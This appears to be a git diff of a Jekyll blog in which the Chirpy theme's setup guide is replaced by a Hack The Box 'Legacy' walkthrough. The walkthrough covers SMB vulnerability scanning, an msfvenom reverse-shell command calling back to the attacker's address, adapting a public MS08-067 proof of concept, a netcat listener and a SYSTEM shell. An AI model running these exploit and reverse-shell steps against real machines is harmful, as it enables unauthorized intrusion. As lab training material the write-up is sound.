@@ -6,166 +6,212 @@ categories: [Blogging, Tutorial]
 tags: [getting started]
 pin: true
 ---
+---
+title: HTB Legacy
+date: 2021-08-03 21:51:00 -0600
+categories: [HTB, Windows]
+tags: [oscp-like, legacy, windows, smb, ms08-067, msfvenom, ctf, hackthebox, htb, reconnoitre, 2to3]
+---
+## Intro
 
-## Prerequisites
+So I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don't have any reason not to.  Community consensus seems to be that TJNull's list of ["OSCP-like"](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#vulnerable-machines) boxes is excellent prep. So I figured I'd start with that. Its broken down by Linux and Windows. I always feel more comforatble on Linux than I do Windows, so I'm going to start doing all the Windows ones first.
 
-Follow the [Jekyll Docs](https://jekyllrb.com/docs/installation/) to complete the installation of `Ruby`, `RubyGems`, `Jekyll` and `Bundler`. Please note that the version of `Ruby` must meet the requirements of the theme on [RubyGems.org](https://rubygems.org/gems/jekyll-theme-chirpy).
 
-## Installation
+## Initial Engagement & Enumeration
 
-There are two ways to get the theme:
+Started with a general reconnassaince and services scan via [reconnoitre](https://github.com/codingo/Reconnoitre). I'd actually stumbled on this tool a while back when I was looking for enumeration and initial engagement automation frameworks. I've used it a lot since then, and I'm thrilled its in play for OSCP. [Codingo](https://twitter.com/codingo_) did an excellent job with it.
 
-- **[Install from RubyGems](#install-from-rubygems)** - Easy to update, isolate irrelevant project files so you can focus on writing.
-- **[Fork on GitHub](#fork-on-github)** - Convenient for custom development, but difficult to update, only suitable for web developers.
+### Reconnoitre
 
-### Install from RubyGems
-
-Add this line to your Jekyll site's `Gemfile`:
-
-```ruby
-gem "jekyll-theme-chirpy"
+```bash
+reconnoitre -t 10.129.192.174 -o . --services
 ```
 
-And add this line to your Jekyll site's `_config.yml`:
+### Scan Results
 
-```yaml
-theme: jekyll-theme-chirpy
+![Scan Results](/assets/img/htb/legacy/legacy_scan_results.png)
+
+Initial scan reveals the box to be:
+- Hostname: Legacy
+- Windows XP (2000 Lan Manager)
+- Likely on SMBv2
+
+## Enumeration
+
+Port 445 is open. Given the OS version and likely patch level of the OS, and lack of other open services, SMB is likely fertile ground for an exploitation vector to gain a foothold on this box. Let's execute some vulnerability scanning functionality within nmap to see if we can find a viable pathway.
+
+### Using NMAP to check for SMB Vulnerabilities
+```bash
+# I recoommend running this with root privileges, so if you aren't root, sudo
+nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.129.192.174
 ```
 
-And then execute:
+Vulnerability scans return two intersting findings: [MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067), and [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010).
 
-```console
-$ bundle
+```
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 ```
 
-Next, go to the installed local theme path:
+# Exploitation
 
-```console
-$ cd "$(bundle info --path jekyll-theme-chirpy)"
+## Finding an Exploit
+I generally believe in following the path of least resistance whenever possible, and ```MS08-67``` is one of the more famous exploits. I think everyone in the world uses jovoi's POC of the exploit, found on their GitHub [here](https://github.com/jivoi/pentest). Considering the age of the POC against our current Attack Platform version (Kali 2021.1 at the time of this article), we will likely need to do some python2 and python3 juggling. I'll link my finalized exploit code later on.
+
+Reading through the POC, we will need to generate our own unique reverse shell payload. I prefer reverse shells whenever possible, as target firewalls are generally more permissive outbound, than inbound (less logging generally, too).
+
+### Generating Shellcode
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.142 LPORT=4443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -a x86 --platform windows
 ```
 
-And then copy the critical files (for details, see [starter project][starter]) from the theme's gem to your Jekyll site.
+Thankfully the POC is well documentated for what it wants for shellcode, but to break this down a bit:
+    - Windows Reverse TCP shell payload
+    - Call back to me on port 4443 (I try to pick ports over 1000 whenever possible)
+    - If the shell exits, keep the program running (hence the thread)
+    - Give it to me in Python format (saves you time reformatting)
+    - x86 architecture
 
-> ⚠️ **Watch out for duplicate files!**
->
-> If your Jekyll site is created by the `jekyll new` command, there will be `index.markdown` and `about.markdown` in the root directory of your site. Please be sure to remove them, otherwise they will overwrite the `index.html` and `_tabs/about.html` from this project, resulting in blank or messy pages.
+![Shellcode Generation](/assets/img/htb/legacy/legacy_shellcode_gen.png)
 
-As an alternative, which we recommend, you can create a Jekyll site [**using the starter template**][use-starter] to save time copying files from the theme's gem. We've prepared everything you need there!
+### Some SC Generation Quirks
+I did screw up and forget to pass the ```-v``` flag, allowing me to rename the buf variable to shellcode. So I reran ```msfvenom``` but I didn't take a new screenshot. 
 
-### Fork on GitHub
+### Converting from Python2 to Python3
+After inserting the new shellcode, I *really* didn't feel like dealing with python2 dependencies, so I converted the python2 syntax of the POC to python3 with [2to3](https://docs.python.org/3/library/2to3.html).
 
-[Fork **Chirpy**](https://github.com/cotes2020/jekyll-theme-chirpy/fork) on GitHub and then clone your fork to local. (Please note that the default branch code is in development.  If you want the blog to be stable, please switch to the [latest tag](https://github.com/cotes2020/jekyll-theme-chirpy/tags) and start writing.)
-
-Install gem dependencies by:
-
-```console
-$ bundle
+```bash
+┌──(nullprism㉿granite)-[~/htb/legacy/10.129.192.174/exploit]
+└─$ 2to3 -w MS08-067.py
 ```
 
-And then execute:
+### Finalizing the Code
+With the code patched the have relevant shellcode, and migrated from python2 to python3, it's ready to execute. If you are looking for my finalized exploit code for MS08-67, it is hosted on my github [here](https://github.com/nullprism/htb-boxes/tree/main/legacy).
 
-```console
-$ bash tools/init.sh
+### Executing the Exploit
+
+Executing the script yields some help and targeting context:
+```
+Usage: MS08-067.py <target ip> <os #> <Port #>
+
+Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
+Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
+Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
+Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
+Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
+Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
+Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
+
+FYI: nmap has a good OS discovery script that pairs well with this exploit:
+nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
 ```
 
-> **Note**: If you don't plan to deploy your site on GitHub Pages, append parameter option `--no-gh` at the end of the above command.
+Based on the output, I'm pretty sure that script by nmap was run in our catch all earlier, but I'll double check.
 
-What it does is:
+```bash
+┌──(nullprism㉿granite)-[~/htb/legacy/10.129.192.174/exploit]
+└─$ nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.129.192.174 -Pn
+```
+```
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 21:14 CDT
+Nmap scan report for 10.129.192.174
+Host is up (0.053s latency).
 
-1. Remove some files or directories from your repository:
-    - `.travis.yml`
-    - files under `_posts`
-    - folder `docs`
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
 
-2. If you use the `--no-gh` option, the directory `.github` will be deleted. Otherwise, setup the GitHub Action workflow by removing the extension `.hook` of `.github/workflows/pages-deploy.yml.hook`, and then remove the other files and directories in the folder `.github`.
-
-3. Automatically create a commit to save the changes.
-
-## Usage
-
-### Configuration
-
-Update the variables of `_config.yml` as needed. Some of them are typical options:
-
-- `url`
-- `avatar`
-- `timezone`
-- `lang`
-
-### Customing Stylesheet
-
-If you need to customize stylesheet, copy the theme's `assets/css/style.scss` to the same path on your Jekyll site, and then add the custom style at the end of the style file.
-
-Starting from `v4.1.0`, if you want to overwrite the SASS variables defined in `_sass/addon/variables.scss`, create a new file `_sass/variables-hook.scss` and assign new values to the target variable in it.
-
-### Running Local Server
-
-You may want to preview the site contents before publishing, so just run it by:
-
-```console
-$ bundle exec jekyll s
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2021-08-09T07:12:11+03:00
 ```
 
-Or run the site on Docker with the following command:
+### Selecting a Target Framework
 
-```terminal
-$ docker run -it --rm \
-    --volume="$PWD:/srv/jekyll" \
-    -p 4000:4000 jekyll/jekyll \
-    jekyll serve
+It was. So my target options here are 1, 5, 6, 7. I feel safe in ruling out the French language pack (#5), and the AlwaysOn option (#7). I typically shy away from Universal options, so let's try 6 first, and if that fails, we can try 1. 
+
+### Setting Up a Listener
+First, let's set up our catcher:
+
+```bash
+nc -lnvp 4443
 ```
 
-Open a browser and visit to _<http://localhost:4000>_.
+### Shell
+After a VPN output mid-exploit, forcing me to reconnect and reset the box, success.
 
-### Deployment
+![Shell Callback](/assets/img/htb/legacy/legacy_shell_callback.png)
 
-Before the deployment begins, checkout the file `_config.yml` and make sure the `url` is configured correctly. Furthermore, if you prefer the [**project site**](https://help.github.com/en/github/working-with-github-pages/about-github-pages#types-of-github-pages-sites) and don't use a custom domain, or you want to visit your website with a base URL on a web server other than **GitHub Pages**, remember to change the `baseurl` to your project name that starting with a slash, e.g, `/project-name`.
+## Post-Exploitation
 
-Now you can choose ONE of the following methods to deploy your Jekyll site.
+### Entry
+```cmd
+C:\WINDOWS\system32>whoami
+whoami
+'whoami' is not recognized as an internal or external command,
+operable program or batch file.
 
-#### Deploy on GitHub Pages
+C:\WINDOWS\system32>echo %computername%\%username%
+echo %computername%\%username%
+LEGACY\%username%
 
-For security reasons, GitHub Pages build runs on `safe` mode, which restricts us from using plugins to generate additional page files. Therefore, we can use **GitHub Actions** to build the site, store the built site files on a new branch, and use that branch as the source of the GH Pages service.
+C:\WINDOWS\system32>ipconfig
+ipconfig
 
-Quickly check the files needed for GitHub Actions build:
+Windows IP Configuration
 
-- Ensure your Jekyll site has the file `.github/workflows/pages-deploy.yml`. Otherwise, create a new one and fill in the contents of the [workflow file][workflow], and the value of the `on.push.branches` should be the same as your repo's default branch name.
-- Ensure your Jekyll site has file `tools/test.sh` and `tools/deploy.sh`. Otherwise, copy them from this repo to your Jekyll site.
 
-And then rename your repository to `<GH-USERNAME>.github.io` on GitHub.
+Ethernet adapter Local Area Connection 2:
 
-Now publish your Jekyll site by:
+        Connection-specific DNS Suffix  . : .htb
+        IP Address. . . . . . . . . . . . : 10.129.192.181
+        Subnet Mask . . . . . . . . . . . : 255.255.0.0
+        Default Gateway . . . . . . . . . : 10.129.0.1
 
-1. Push any commit to remote to trigger the GitHub Actions workflow. Once the build is complete and successful, a new remote branch named `gh-pages` will appear to store the built site files.
-
-2. Browse to your repo's landing page on GitHub and select the branch `gh-pages` as the [publishing source](https://docs.github.com/en/github/working-with-github-pages/configuring-a-publishing-source-for-your-github-pages-site) through _Settings_ → _Options_ → _GitHub Pages_:
-
-    ![gh-pages-sources](https://cdn.jsdelivr.net/gh/cotes2020/chirpy-images/posts/20190809/gh-pages-sources.png){: width="850" height="153" }
-
-3. Visit your website at the address indicated by GitHub.
-
-#### Deploy on Other Platforms
-
-On platforms other than GitHub, we cannot enjoy the convenience of **GitHub Actions**. Therefore, we should build the site locally (or on some other 3rd-party CI platform) and then put the site files on the server.
-
-Go to the root of the source project, build your site by:
-
-```console
-$ JEKYLL_ENV=production bundle exec jekyll b
+C:\WINDOWS\system32>
 ```
 
-Or build the site with Docker by:
+### Legacy OS Quirks
+You can be like me and forget you are on Windows XP, it is old after all, and type ```whoami```. It doesn't exist on XP. I was able to enumerate the host name, but not the username with system variables in the cmd shell. After some research, I discovered you could pull ```whoami.exe``` onto the box if you really needed to know which user you are, but its well-documented that this exploit lands you as **NT AUTHORITY\SYSTEM**. 
 
-```terminal
-$ docker run -it --rm \
-    --env JEKYLL_ENV=production \
-    --volume="$PWD:/srv/jekyll" \
-    jekyll/jekyll \
-    jekyll build
-```
+### Privilege Escalation
+Long story, short; we don't need to bother with privilege escalation. We can go straight for the flags.
 
-Unless you specified the output path, the generated site files will be placed in folder `_site` of the project's root directory. Now you should upload those files to your web server.
+### Flags
+![User Flag](/assets/img/htb/legacy/legacy_user_flag.png)
 
-[starter]: https://github.com/cotes2020/chirpy-starter
-[use-starter]: https://github.com/cotes2020/chirpy-starter/generate
-[workflow]: https://github.com/cotes2020/jekyll-theme-chirpy/blob/master/.github/workflows/pages-deploy.yml.hook
+![Root Flag](/assets/img/htb/legacy/legacy_root_flag.png)
